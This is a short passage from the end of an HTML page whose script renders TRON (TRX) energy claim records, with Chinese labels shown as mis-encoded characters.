                    <p><strong>è·å–èƒ½é‡ï¼š</strong>${record.energyAmount} TRXèƒ½é‡</p>
                    <p><strong>é¢†å–æ—¶é—´ï¼š</strong>${record.receiveTime}</p>
                </div>
            `).join("");
        }
    </script>
</body>
</html>
